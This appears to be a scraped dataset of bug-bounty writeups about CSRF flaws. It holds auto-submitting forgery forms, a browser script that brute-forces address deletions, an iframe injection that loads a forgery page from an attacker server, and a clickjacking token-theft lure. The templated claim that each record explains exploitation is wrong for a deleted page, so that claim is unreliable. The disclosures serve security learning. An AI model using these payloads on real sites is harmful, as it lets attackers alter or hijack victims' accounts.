Unknown 4 August 2017 at 09:04 nice and best of luck for future hunting bro. Reply Delete Replies Noman Shaikh 4 August 2017 at 09:31 Thanks Delete Replies Reply Reply Unknown 4 August 2017 at 09:43 Nice! write up! Reply Delete Replies Noman Shaikh 4 August 2017 at 09:52 Thanks :) Delete Replies Reply Reply Unknown 4 August 2017 at 09:47 Awesome Writeup, Dear! Reply Delete Replies Noman Shaikh 4 August 2017 at 09:52 I am Glad that you liked it :) Delete Replies Reply Reply securitybreaker 4 August 2017 at 10:21 Awsome After Long time Read the Cool Bypass :) Reply Delete Replies Noman Shaikh 4 August 2017 at 10:30 Thanks :) Delete Replies Reply Reply An0n 3xPloiTeR 5 August 2017 at 18:37 BugChod Baba Zindabad <3 :D Reply Delete Replies Reply Unknown 7 August 2017 at 02:30 Really cool!! Reply Delete Replies Noman Shaikh 9 August 2017 at 10:04 Thanks :) Delete Replies Reply Reply Unknown 9 August 2017 at 00:30 Cool Write Up O:) Reply Delete Replies Noman Shaikh 9 August 2017 at 10:04 Thanks sir ^_^ Delete Replies Reply Reply javascript:alert(1) 15 September 2017 at 12:09 Thanks bro <3 learned something new <3 Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog Exploiting CORS Misconfiguration using XSS February 18, 2018 Hello All, This Post is about how i exploited a Cross Origin Resource Sharing (CORS) Misconfiguration with the help of Cross Site Scripting (XSS) After reporting some bugs to Netgear Kudos program I started getting old private program invites on Bugcrowd One of which was with 300+ researchers and running from 2015 I wasn't happy about that, As i thought I won't be able to find any thing as the program is running from such a long time and so many others have looked at it before me. Even if i will get something the chances of that being duplicate is high. But then Osama said this So I finally started looking at it and trying my best to find something, Got one P3 but it went duplicate :( But then I got an endpoint that was having simple CORS misconfiguration and the endpoint was giving user details like email address , age , g ender , DOB , etc in response It was triaged, paid and fix within a week I was happy and was planing ... Read more Two Factor Authentication Bypass | SendGrid September 15, 2017 Hello All, Today I will be sharing how I was able to Bypass SendGrid 2FA What is SendGrid : A Cloud-based email service to deliver emails on behalf of companies having 55,000+ customers ~ https://sendgrid.com/about/ What is Two Factor Authentication : Two-Factor Authentication (2FA) is a type of multi-factor authentication confirming a user’s claimed identity by utilizing a combination of two different authentication methods. 2FA makes it harder for potential intruders to gain access and steal user’s personal data or identity. ~ https://en.wikipedia.org/wiki/Multi-factor_authentication My Story with them : I started looking for bugs in SendGrid and after trying whole night i found a XSS Reported it and when to sleep peacefully Next morning I checked my email The bug went duplicate :( It felt bad I didn't want to test further so I went to delete my account ( I don't want emails from them :__: ) I... Read more Noman Shaikh Visit profile Archive February 2018 1 January 2018 1 September 2017 1 August 2017 1 July 2017 1"}
{"source_url": "https://medium.com/@sainttobs/csrf-token-bypasss-a-tale-of-my-2k-bug-ff7f51166ea1", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@sainttobs/csrf-token-bypasss-a-tale-of-my-2k-bug-ff7f51166ea1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@navne3t/csrf-csrf-csrf-f203e6452a9c", "title": "CSRF CSRF CSRF…. This article is about few CSRFs i have… | by Navneet | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@navne3t/csrf-csrf-csrf-f203e6452a9c. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nCSRF CSRF CSRF…. This article is about few CSRFs i have… | by Navneet | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in CSRF CSRF CSRF… Navneet 3 min read · Feb 3, 2020 -- Listen Share This article is about few CSRFs i have found in private programs. Although all these CSRFs are of low impact but enough to get paid/swag.The aim of this article is to let beginners/readers know what functionality or action could be vulnerable to CSRF in a web application. Feed backs and comments are welcomed. 1.) CSRF to spam shopping cart. The first functionality where i had found CSRF was adding all products of some public wish-list in to your cart. This website have the functionality which let user to add the wish-list of other user in to his/her cart. So, user A can add products to his/her wish-list and can make his/her wish-list public which let other users to see the wish-list. Now, as user B there is a button of add to cart , when you click on it that public wish-list will be added in to your cart. The button was making a simple HTTP GET request which looks like this https://www.SomeWebsite.com/xyz?some_page=wishlist&move_all=true&w_id=1337&public_cid=31337 There were no HTTP headers which contains CSRF Token and none of the parameter was there to protect it from CSRF. So, attacker can add alot of products in to his/her wishlist and then perform CSRF to spam the cart of victim. Reward/bounty This was fixed within a day and $25 was rewarded for this. 2.) Bypass of CSRF protection to delete the bookmark. The second CSRF was found at the functionality which can let user to delete his/her bookmark jobs. As i mentioned above this delete button was also making GET HTTP request BUT i was not able to perform CSRF. I looked for the reason why CSRF is not working for this request and then i realise it could be referer header which may be protecting this request from CSRF. So, i thought of trying the bypass where you can create the whole path of website in your website. e.g. myCSRFwebsite.com/www.victimWebsite.com/abc/xyz/csrf.html The website was checking the value of referer header , whether it contains the path www.victimWebsite.com/abc/xyz/csrf.html and thus , attacker’s website contains the folders/path as above string , website allows the CSRF. Here is the link of write-up of the bypass https://medium.com/bugbountywriteup/critical-bypass-csrf-protection-on-ibm-313ffb68dd0c Reward/bounty I thought I will get good amount because I showed them how CSRF protection can be bypassed but they paid only $25 for this. 3.) CSRF disguised in APIs I have found this CSRF in a private program of hackerone where the whole website was calling the API to perform the actions. So, i thought there will be no chance of CSRF because all API calls to perform any action contains the Auth-header which protect the request from CSRF. But after looking at every request i found two endpoints , one of which performs deletion of phone number and the other was changing the communication settings and the best part was it was GET request and POST Request respectively with no CSRF token. After this i realise , it is best to look for all the actions , may be there are some actions which is not performed by API and can be vulnerable to CSRF. Reward/Bounty I got no bounty for this , but got 14 repo points at hackerone. I added this bug in this article because i learned something new from this finding. 4.) CSRF to delete favourite list [T-Shirt as a swag]. There was a section in the website which let user to favourite the articles. Now there was also a button to delete the favourite list. And that action was done by a POST HTTP request with no CSRF Token in the POST request. So, CSRF can be performed to Delete the article from favourite list. Reward/bounty They sent me a T-shirt as a reward/swag. Thanks! Hope you like this post. Feel free to comment. -- -- Written by Navneet 136 followers · 0 following I am a Computer Science - Information Security student. I write stuff about web application security bugs/issues. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://fellchase.blogspot.com/2020/02/site-wide-csrf-on-popular-program.html", "title": "Site wide CSRF on a popular program", "friendly_explanation": "This is a bug bounty writeup from https://fellchase.blogspot.com/2020/02/site-wide-csrf-on-popular-program.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSite wide CSRF on a popular program Skip to main content Search This Blog Ajinkya's blog Blog about programming, bug bounty & tech Site wide CSRF on a popular program Get link Facebook X Pinterest Email Other Apps Wednesday, February 05, 2020 I found this bug in the same program that I explained in this post \" Authorization bug every bug hunter missed \" I was moving through another target on this program when I noticed that there was no CSRF protection like there were no tokens etc so I wondered what they were using to prevent CSRF, I noticed some high entropy strings in headers but request worked without those headers as well so that wasn't protecting the website from CSRF. Request body consisted of JSON objects basically {key: \"value\"} pairs the assumption behind using it was that in a typical CSRF attack attackers don't send JSON payloads, so using JSON will naturally protect the application against CSRF. Here's where the trick comes in, It's actually more of check that you should perform while trying to find CSRF bugs, I spotted it on Twitter first you may or may not be familiar with it, here's how it works. It's very simple assume that server side framework is expecting some JSON input by default in the HTTP Request body so if it detects JSON object it will automatically parse it. But even if you send regular Content-Type that is application/x-www-form-urlencoded then also it will automatically parse that and start using it, problem is caused by not checking the Content-Type, it should be strictly application/json if you're expecting JSON input. So in this case to trigger CSRF I just sent regular CSRF payload but due to their negligence of not validating Content-Type header to be strictly JSON server accepted the regular HTTP parameters and triggered the CSRF. <html> <form id=\"csrf\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\" action=\"https://www.example.com/api/REDACTED/PATH\"> <table> <tr><td>primaryPhoneType</td><td><input type=\"text\" value=\"0101101101\" name=\"primaryPhoneType\"></td></tr> <tr><td>firstName</td><td><input type=\"text\" value=\"YOUREcsrfedCongratsbtw\" name=\"firstName\"></td></tr> </table> <input type=\"submit\" value=\"https://www.example.com/api/REDACTED/PATH\"> </form> <script type=\"text/javascript\"> document.getElementById('csrf').submit() </script> </html> This could have been prevented by validating Content-Type header to be application/json In my case the server was accepting regular HTTP Post parameters along with expected JSON, so I reported the bug, but my report was marked as duplicate 😩 against someone who reported site wide CSRF using Flash. If you find JSON objects without CSRF protection being passed around in HTTP body try to change it to regular HTTP parameters and see if it works, if the server side application is accepting non JSON parameters then it'll process the input and you maybe able to get a CSRF. Happy bug hunting. bug bounty write up Ajinkya Pathare Guy with a business degree interested in finance, web security and programming Get link Facebook X Pinterest Email Other Apps Comments pforprathm Wednesday, February 12, 2020 2:11:00 pm How you perform CSRF (By converting json to form body) ?? Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog Installing XFCE & other things on Arch Linux Sunday, June 04, 2017 How to do a complete Arch Linux install with XFCE, LightDM, Udisks, Yaourt, and other essentials Arch Linux is a lightweight Linux distribution and installing Arch Linux teaches you a lot about how system works under the hood, after you've installed Arch you'll start to appreciate command line and Arch's install procedure. I used to like distributions such as Parrot and Ubuntu because they already had packages installed and configured for me, but the point of installing Arch is to learn about Linux system. Learning core components of Linux and knowing which packages you've installed will also help you in fixing problems which might arise in the future, also building a system from command line is fun. Like Arch, XFCE Desktop Environment is also lightweight, minimal, and not resource hungry. Though XFCE is simple and lightweight it has some modern features, and if you customize it like me, It'd look really cool while taking about 200 MB to 300 MB of your m... Read more Releasing Flumberbuckets: S3 Bucket Enumeration Tool for Bug Hunters Monday, December 16, 2019 Flumberbuckets is a part of suite of scripts that I'll be open-sourcing on GitHub in flumberboozle repository, scripts in this repository are supposed to aid bug hunters in hunting, automating workflows, etc. There is also another script in flumberboozle repository which is a portscanner with scan auto-save, auto-startup function called portboozle. What is flumberbuckets? Flumberbuckets is is yet another S3 bucket enumeration tool which you can choose to use while hunting on bug bounty programs or during security assessment. I designed this tool to serve my purposes and now I am open-sourcing it, there are several different tools that exist for people with different tastes. The aim of this tools was to present S3 bucket enumeration results in better format which is visually more appealing than scrolling through output of a bash script that just runs aws s3 ls in a loop. How does it work? Flumberbuckets is a really simple script which combines the best of existin... Read more Powered by Blogger Theme images by Matt Vince Ajinkya Pathare Guy with a business degree interested in finance, web security and programming Visit profile Archive 2020 1 February 1 Site wide CSRF on a popular program 2019 2 December 2 2017 5 June 2 May 1 April 2 Show more Show less Labels Arch Linux Installation broken access control bug bounty Linux tools typecatcher write up XFCE Total Pageviews Social Media Follow @fellchase Tweets by fellchase"}
{"source_url": "https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d", "title": "Stored Iframe Injection + CSRF = Account Takeover 😎😎 | by Rounak Dhadiwal | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@irounakdhadiwal999/stored-iframe-injection-csrf-account-takeover-42c93ad13f5d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored Iframe Injection + CSRF = Account Takeover 😎😎 | by Rounak Dhadiwal | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored Iframe Injection + CSRF = Account Takeover 😎😎 Rounak Dhadiwal 3 min read · Dec 16, 2019 -- 1 Listen Share Before we Start lets Clear some Questions What is Iframe Injection. Frame injection is a type of code injection vulnerability where attacker can injection frames which contains links to malicious websites or advertisements links. To know more about Iframe Injection you can click here . 2. After Injecting the Iframe in page, who actually calls the Iframe [ Client’s Browser or server]. Iframes that are injected into web pages are mostly called by Client’s Browser except in some cases like PDF generators. To check who is calling the injected frame you can inject an frame which source of Burp Collaborator like [<iframe src=xxxxxx.burpcollaborator.net></iframe> ], and checking the logs of Burp Collaborator will reveal the caller of Frame.😮😮 3. What is Cross Site Request Forgery ( CSRF). Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. To learn more about CSRF you can visit PortSwigger . So Lets get Started When you start to hunt on particular domain , the best thing to do first is to take a look at all the features of the domain and take a note of that. Understanding the flow of a particular website will help you to chain attacks and logically break it. It was a private Program so lets consider the site ABC.com After looking at all the features i got to know that there is an Discussion Forum where all the members of community can chat with each others. Press enter or click to view image in full size Here you can start a topic and discuss it with your community members. So i started to inject my payload on reply feature, which concluded that the reply section was vulnerable to HTML Injection but not to XSS. I tried to inject many XSS payloads but didn't succeeded. Press enter or click to view image in full size So i tried to inject Iframe and BOOM! It was reflected. 😋 😋 So my next task was to increase the Impact of these vulnerability ,😮😮 so i started other features of the website too. After some time i came across a section where i was able to change my email address . The first think that came into my mind was to try CSRF attack . And the request to change the email looked like. Press enter or click to view image in full size Which confirmed that Email change feature is vulnerable to CSRF attack .So i quickly generated HTML code. Press enter or click to view image in full size But to perform an CSRF attack Victim must link on visit a particular link from where the request to change email will be sent. But these was not possible here because admin would not click on any malicious link . So i thought lets combine the CSRF with Iframe Injection which i found earlier . So i started my AWS Server lets consider it has ip [x.x.x.x] and copied the CSRF code in index.html page. After that i injected the iframe payload i.e <iframe src=http://x.x.x.x/index.html”></iframe> in discussion forum and it was GAME OVER for admin after viewing the discussion forum, because he’s email id was changed to attacker’s email id. ATTACK SCENARIO: - Attacker will inject iframe into Discussion Forum which contains the link of email change request. After victim or admin visits the discussion forum their browser’s will load the iframe which will lead to send the email change request from victims machine. Thank you for reading . 😊😊 Cybersecurity Ethical Hacking Information Security Penetration Testing Hacking -- -- 1 Written by Rounak Dhadiwal 138 followers · 21 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@vbharad/2-fa-bypass-via-csrf-attack-8f2f6a6e3871", "title": "2 FA Bypass via CSRF Attack. Introduction : | by Vishal Bharad | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vbharad/2-fa-bypass-via-csrf-attack-8f2f6a6e3871. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n2 FA Bypass via CSRF Attack. Introduction : | by Vishal Bharad | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in 2 FA Bypass via CSRF Attack Vishal Bharad 2 min read · Dec 23, 2019 -- Listen Share Introduction : Hello Guys Again, I am Vishal Bharad , I’m here again to share about my findings on How I Bypass 2 Factor Authentication via CSRF (Cross Site Request Forgery). About the Vulnerability : You all know about the 2FA Bypass Vulnerability. There are some Techniques. Bypassing 2fa using conventional session management Bypassing 2fa Via OAuth mechanism Bypassing 2fa via brute force Bypassing 2fa using race conditions (RARE) Bypassing 2fa using modifies response Bypassing 2fa using Activation link Bypassing 2fa in password reset page But here I am able to disable the 2FA via Client side attack which is CSRF. For Discovering the bug I have tried to Disable 2FA using CSRF file. But I have seen that there is token is generated in the CSRF poc. But when I tried this html file that token is never get expired. This token is used again and again to disable 2FA on another Account. Note : Always try to Disable 2FA using CSRF Attack. So the program is Mail.ru which is Available on Hackerone. Mail.ru - Bug Bounty Program | HackerOne The Mail.ru Bug Bounty Program enlists the help of the hacker community at HackerOne to make Mail.ru more secure… hackerone.com Pandao.ru is the extended program name that I have found vulnerability on this domain. Tools Used for this Vulnerability: BurpSuite Steps to Reproduce the Vulnerability Go to https://pandao.ru/profile/settings and sign up for two accounts. In which first is attackers account and second is Victim’s Log in to Attackers account and capture the Disable 2FA request in Burp suite and generate CSRF poc. Save the CSRF poc file with extension .HTML. Now log in into Victim’s account in Private Browser and fire that CSRF file. Now you can see that It disable 2FA which leads to 2FA Bypass. Video is Attached to Demonstrate this Vulnerability. Thank You Disclosure : I reported to them 9th August They saw the report, steps to reproduce, and PoC(Video). And, this program is in Extended scope of mail.ru and They do not pay for Client side attacks so I didn't get any Bounty for this. But Still Worth. :) Press enter or click to view image in full size Thanks Looking forward to share more blogs Best Regards Vishal Bharad Linkedin Profile : https://www.linkedin.com/in/vishal-bharad-b476b388/ Security Bug Bounty -- -- Written by Vishal Bharad 836 followers · 3 following Penetration Tester, Bug Bounty Hunter, Security Researcher No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://smaranchand.com.np/2019/10/an-inconsistent-csrf/", "title": "An inconsistent  CSRF – Smaran Chand", "friendly_explanation": "This is a bug bounty writeup from https://smaranchand.com.np/2019/10/an-inconsistent-csrf/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAn inconsistent CSRF – Smaran Chand Skip to content Smaran Chand Menu Home About Me Search for: October 15, 2019 An inconsistent CSRF I discovered Cross-Site Request Forgery (CSRF) issue in one of the bug bounty programs but limited to some easy and simple actions only. After spending a few minutes by browsing each and every functionality in the web application I discovered that a feature to delete “Shipping Address” from the account was not protected with CSRF token or any control mechanism. It wasn’t easy as I thought it, because one of the parameters was “dynamic” varying from account to account and it had a different numeric value for each user. POST /MySettings/DeleteAddress?addressId=14502 HTTP/1.1 Host: www.xyzcompany.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=utf-8 X-Requested-With: XMLHttpRequest Content-Length: 2 Connection: close Referer: https://www.xyzcompany.com/MySettings Cookie: Nop.customer=peepdipeepdi_cookies_and_biscuits; ASP.NET_SessionId=sessionid_xxxx; __RequestVerificationToken=token_xxxx {} As we can see in the HTTP request CSRF protection is not present but the parameter “addressId” differs from person to person. Now in order to make CSRF successful we need to guess addressId and craft the payload respectively which is very hard to gather. I remembered we had faced this kind of issue during the VAPT project of a client at our workplace with my friend Nittam . I wrote a simple JS code which would brute requests from victims browser within the provided range. For example, whenever a victim will click on CSRF payload his browser would send hundreds of the web request with certain range of numeric addressId and upon a match, the address from victims account will be deleted. <html> <!-- Dynamic CSRF PoC To delete address from any account --> <script> function submitRequest(id) { var xhr = new XMLHttpRequest(); xhr.open(\"POST\", \"https://www.xyzcompany.com/MySettings/DeleteAddress?addressId=\"+id, true); xhr.setRequestHeader(\"Accept\", \"*/*\"); xhr.setRequestHeader(\"Accept-Language\", \"en-US,en;q=0.5\"); xhr.setRequestHeader(\"Content-Type\", \"application/json; charset=utf-8\"); xhr.withCredentials = true; var body = \"{}\"; var aBody = new Uint8Array(body.length); for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i); xhr.send(new Blob([aBody])); } for (i=14400;i < 14510; i++) { submitRequest(i); } </script> </html> It is obvious that running above script would reduce the browser’s performance, the browser could act unresponsive as well because of hundreds of the request at a time. Whenever a victim will visit the CSRF payload, the number of requests will be sent via the victim’s browser. And upon the match of AddressId, his saved address will be deleted. Bruting AddressId and sending HTTP requests. And It worked !!! Bug Bounty Post navigation Older post No Rate limiting eligible for bounty ? Newer post Subdomain takeover via pantheon 3 Comments sam says: October 24, 2019 at 8:05 am nice post, now waiting for your next post. Reply Pingback: List of bug bounty writeups · Pentester Land – Blog du Chauve Pingback: These Bug Bounty Writeups will Change Your Life - PrimeHackers Leave a Comment Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Save my name, email, and website in this browser for the next time I comment. Notify me of follow-up comments by email. Notify me of new posts by email. Δ Facebook | Twitter"}
{"source_url": "https://medium.com/@rajeshranjan457/how-i-csrfd-my-first-bounty-a62b593d3f4d", "title": "How I CSRF’d My First Bounty!. Hello Everyone! | by Rajesh Ranjan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@rajeshranjan457/how-i-csrfd-my-first-bounty-a62b593d3f4d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I CSRF’d My First Bounty!. Hello Everyone! | by Rajesh Ranjan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I CSRF’d My First Bounty! Rajesh Ranjan 2 min read · Mar 3, 2020 -- 2 Listen Share Hello Everyone! This is my first blog post, and I decided to start off by sharing about my recent finding. It was a CSRF issue, which earned me $500! What makes this even more special for me is that it was my first bounty ever! Introduction to CSRF: Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. Initial Reconnaissance Phase So, I got an invitation for this private program on Bugcrowd, and it was an e-commerce website. During my initial recon, I noticed that the users can add their address into their account. So, I quickly checked the request and there was some token named form_key that was being used to protect the users from CSRF attack. Press enter or click to view image in full size form_key to protect CSRF attacks So, the next thought which came to my mind was, is there any server side validation on this token? I quickly logged into my second test account, generated a CSRF PoC , removed the token for this particular request, and sent it to the victim. And the final request was something like this: Press enter or click to view image in full size Removed the form_key value in the request Did you notice something? I have removed the form_key value from the PoC, and not the entire input tag. I sent this to the victim, and when the victim clicked on “Submit”, the address was added to his account, which was the attacker’s address. Press enter or click to view image in full size Attacker’s address added to victim account Boom! Like I suspected, there was no server-side validation on form_key token. So, the next time you come across a CSRF token, be sure to perform this kind of validation. Timeline: Issue reported: 06 Nov 2019 Triaged as P3: 09 Nov 2019 Bounty received: 05 Jan 2020 Thanks for reading. Hope it helps . Connect me on twitter https://twitter.com/_rajesh_ranjan_ Infosec Bugcrowd Csrf Bug Bounty -- -- 2 Written by Rajesh Ranjan 149 followers · 43 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://flex0geek.blogspot.com/2020/02/using-csrf-i-got-weird-account-takeover.html", "title": "Using CSRF I Got Weird Account Takeover", "friendly_explanation": "This is a bug bounty writeup from https://flex0geek.blogspot.com/2020/02/using-csrf-i-got-weird-account-takeover.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUsing CSRF I Got Weird Account Takeover Skip to main content Search This Blog Mohamed Sayed - Blog Using CSRF I Got Weird Account Takeover Get link Facebook X Pinterest Email Other Apps - February 05, 2020 Hi guys, I'm back again this bug was interesting and weird let's start. let's refer to the target's name as (target.com) I start to test the domain like what I do in my testing, I used sublist3r to enumerate the subdomains, in one of these subdomains I start to test the password reset function I sent a request to my email to change the password, i opened the link and sent the request to change the password but i used my Burp to see the request and it looks like that there is a token for CSRF I tested this token and deleted it but the change happens, that means there is no filtring for this token there is a CSRF bug here and there is another thing the token of reset password not in the request not in the cookies or in the body so i think it's in the sessions and how i knew that? I test the function of reset password I sent another link to my account and i sent the same request but it returns 403, I opened the new reset link bug didn't use it and I go back to my burp and sent the request again and it works and I changed the password with outsend the request from the browser, I understand the function when the user opens the link there is a session will open and will add the token on it and there is something like value to chack like (change=1) if it (1) the server will change the password which comes from the same session if it (0) it will return 403 this what I understand from test the function so now if the user opened the link and didn't use the token it will not be expired and we can use the CSRF bug in this time and we will gain account takeover in this case. I liked this bug so I published it, but the subdomain was out-of-scope and I didn't notice it XD. Goodbye. Get link Facebook X Pinterest Email Other Apps Comments احمد الماكى February 24, 2020 at 6:37 PM hey dude ! can i talk with you private this is my profile https://www.facebook.com/profile.php?id=100009760126088 Reply Delete Replies Reply Unknown February 20, 2022 at 1:06 AM هو هنا مكنش بيت check الباسوورد الحالية ايه؟ Reply Delete Replies Hossam Hussein April 17, 2025 at 4:43 AM لا لان Function المستخدمه هنا Reset Password يعني هو ميعرفش Password اصلا. Delete Replies Reply Reply Add comment Load more... Post a Comment Popular posts from this blog [BlackHatMEA-CTF 2024] cockatoo PWN challenge - September 02, 2024 ( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ) (إن أحسنت فمن الله، وإن أسأت فمن نفسي والشيطان) Let's check the \"cockatoo\" pwn challenge from Blackhat MEA CTF 2024. Reverse the Binary we note that the binary takes the input byte by byte and there is a counter (i hate static analysts) Dynamic analysis Let's jump to GDB and see what happened. I set a breakpoint on the road to get the stack address in which our input will be stored, and the following screenshots show our input increase and the counter before the RIP address. and the payload to overwrite the counter and control where the next write will be in the following screenshots and we added to the counter (16) and could overwrite the RIP now we have to find our gadgets and do a simple execve, right?!!! NOOOOOO Exploit we don't have gadgets for \"rdx, rdi, rsi\" and we need to do \"execve(rdi, rsi, rdx)\", but we have \"syscall\" and \"pop rax\" so its time for our SROP attack. we... Read more [WEB] ASC Wargame CTF 2024 - Challenge Hot Proxy - September 29, 2024 ( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ) (إن أحسنت فمن الله، وإن أسأت فمن نفسي والشيطان) It was a nice CTF, I got 2nd place with my guys: Hissien Misbah ( Twitter ) Mohamed Bebo ( Linkedin ) Sameh ( Linkedin ) Osama Zidan ( Linkedin ) A picture during solving this challenge in the last 5m of the CTF (thinking that we got 1st place). Let's walk through the Web Challenge Hot Proxy, note that we did not solve it during the time of the CTF it was a minute way, let's start. Note: there is no source code in the challenge attachment, I requested it from the author ( @serWazito0 ) thanks to him, challenges files ( ASCWG_2024_CTF ). Note: the flag file in the server and called \"flag_<RANDOM>.txt\", so we have to get RCE. From the title I know that there is an \"SSRF\" vulnerability in this challenge and from the description, we know that there is an internal application called \"app1\" with a route called \"/secret\" so our target is to access... Read more Rooting with chwoot: Deep Dive into CVE-2025-32463 - July 20, 2025 Discovered in Sudo version 1.9.15 and fixed in 1.9.17p1, CVE-2025-32463 is a logic vulnerability that allows an attacker to load arbitrary `.so` libraries via a controlled `nsswitch.conf` path, leveraging unsafe pivot root logic. This blog walks through the vulnerability analysis, control flow trace, and source code references. Ref: Vulnerability Advisory Exploit : Maybe it will not work with you if this happens, try to write your own vulnerable directory, and try the exploit after understanding it. Read more Powered by Blogger Theme images by jpique Archive July 2025 1 February 2025 3 December 2024 1 September 2024 2 August 2024 1 July 2024 2 May 2024 2 April 2024 2 November 2023 1 May 2023 1 January 2022 1 October 2021 3 August 2021 1 July 2021 1 April 2021 1 October 2020 1 August 2020 1 February 2020 1 November 2019 2 October 2019 3 April 2019 9 Show more Show less Report Abuse"}
{"source_url": "https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0", "title": "How I exploit the JSON CSRF with method override technique | by secureITmania | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@secureITmania/how-i-exploit-the-json-csrf-with-method-override-technique-71c0a9a7f3b0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I exploit the JSON CSRF with method override technique | by secureITmania | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Member-only story How I exploit the JSON CSRF with method override technique secureITmania 4 min read · Mar 7, 2020 -- 1 Share Introduction — CSRF: CSRF(Cross-Site Request Forgery) is a kind of web application vulnerability, using this a malevolent can forge the HTTP request without the actual user knowledge. This will result in a serious security flaw in the web application. In this write up I will explain how to identify the JSON CSRF vulnerability and the challenge I face to escalate this bug in a recent project. Generally, the JSON CSRF is not always possible in every web application that uses the JSON body. Mainly it depends on the authentication mechanism. To identify this, we have to make sure that the HTTP request satisfies the below conditions. The authentication mechanism should be in the cookie-based model. (By default cookie-based authentication is vulnerable to CSRF attacks) The HTTP request should not be fortified by the custom random token on the header as well in the body. The HTTP request should not be fortified by the Same Origin Policy. “If the above conditions were satisfied we can directly forge the JSON request by simply making an Ajax request from the other Origin. ” Note: These are the primary conditions to achieve the CSRF in JSON. But It is possible to exploit the JSON CSRF even though 2nd and 3rd points are not satisfied. Challenges I faced to exploit the JSON CSRF in… -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by secureITmania 846 followers · 76 following https://www.youtube.com/@secureitmania/videos | https://www.buymeacoffee.com/secureitmania |https://secureitmania.in| https://t.me/secureitmania_world Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40", "title": "Bypass CSRF With ClickJacking Worth $1250 | by Saad Ahmed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saadahmedx/bypass-csrf-with-clickjacking-worth-1250-6c70cc263f40. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBypass CSRF With ClickJacking Worth $1250 | by Saad Ahmed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Bypass CSRF With ClickJacking Worth $1250 Saad Ahmed 2 min read · Jul 16, 2019 -- Listen Share Hello friends, I hope you all are doing well, so this write up is all about how I chained the two different vulnerabilities to update the victim account details. Let’s assume the website name is redacted.com So when I visited the profile page https://redacted.com/editinfo/ & tried to change the account details there was a CSRF token I tried different methods to bypass that CSRF protection but failed, then I found the suspicious endpoint that was disclosing the CSRF token https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ So when I opened that endpoint I found the CSRF token in the response, Now the next part was to steal the CSRF token & then I found out that there was no protection from the click jacking I created an HTML + JS Script to exploit the CSRF in just 1 Click <!DOCTYPE html> <html> <head> <title></title> </head> <body> <center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center> <h3>Click inside the box and Press CTRL+A then CTRL+C</h3> <div style=”border: 2px solid gray;”> <iframe src=” https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/ \" width=”100%” style=”opacity: 0\"></iframe> </div> <h3>Click inside the box and press CTRL+V</h3> <input type=”password” name=”” size=”1\"> <br> <button id=”btn”>Click to Win</button> <div style=”display: none;”> <form action=”” method=”POST”> <input type=”hidden” name=”addrid” value=”12741305\" /> <input type=”hidden” 